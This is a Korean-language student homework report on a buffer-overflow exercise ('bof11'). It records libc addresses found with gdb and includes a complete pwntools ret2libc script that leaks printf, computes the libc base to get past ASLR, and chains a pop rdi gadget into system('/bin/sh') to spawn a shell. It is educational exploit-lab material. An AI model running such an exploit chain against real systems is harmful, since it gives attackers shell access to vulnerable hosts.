# Report. HW9.

## `bof11`

`gdb`로 `bof11`을 디버깅하는 상황에서 필요한 요소들의 주소값을 조사해 보았다(여러번의 실행에 걸쳐서 돌리게 되면 ASLR에 의해 매번 glibc와 기타 요소들의 주소들이 달라지기 때문에 한번의 `bof11` 실행에서 각각의 주소값들을 확인하여야 한다.)

조사한 결과...

    glibc(of one bof11)   @ 0x00007faaa2c65000.
    printf(of one bof11)  @ 0x00007faaa2cba800.
    /bin/sh(of one bof11) @ 0x00007faaa2df1d57.

와 - system의 경우 `gef`에서 `search-pattern` 명령어로 찾아본 결과 3개의 결과값이 나와서 정확하게 무엇을 쓰려고 하는지 확인해볼 필요가 있었는데, 마침 `bof9`에서 내가 필요로 하는 `system`의 주소를 출력하길래 여기서의 `glibc`와 `system`의 주소값을 확인할 수 있었다 -

"

    glibc(of bof9) @ 0x00007ffff7a0d000
    system(of bof9) @ 0x00007ffff7a52390

    pop rdi ; ret" @ 0x0000000000021102.

- `RET`와 `buf` 사이의 거리 = 18.
-

이걸 바탕으로 목요일 수업 시간에 만들었던 payload exploit 파일 뼈대를 다듬었다.

<details><summary>exp_bof11.py</summary>
<p>

```python
from pwn import *

p = process('./bof11')

p.recvuntil('printf() address : ')
printf_addr = int(p.recvuntil('\n').decode('UTF-8').strip(), 16)

glibc_offset = {}
glibc_offset['poprdi'] = 0x0000000000021102
glibc_offset['printf'] = -(0x00007faaa2c65000 - 0x00007faaa2cba800)
glibc_offset['binsh']  = -(0x00007faaa2c65000 - 0x00007faaa2df1d57)
glibc_offset['system'] = -(0x00007ffff7a0d000 - 0x00007ffff7a52390)

glibc_addr = printf_addr - glibc_offset['printf']
system_addr = glibc_addr + glibc_offset['system']
binsh_addr  = glibc_addr + glibc_offset['binsh']
poprdi_ret  = glibc_addr + glibc_offset['poprdi']

print(hex(glibc_addr))
print(hex(printf_addr))
print(hex(poprdi_ret))
print(hex(binsh_addr))
print(hex(system_addr))

payload = ('x' * 18).encode()
payload += p64(poprdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.send(payload)
p.interactive()

```
</p></details>

# -- END --

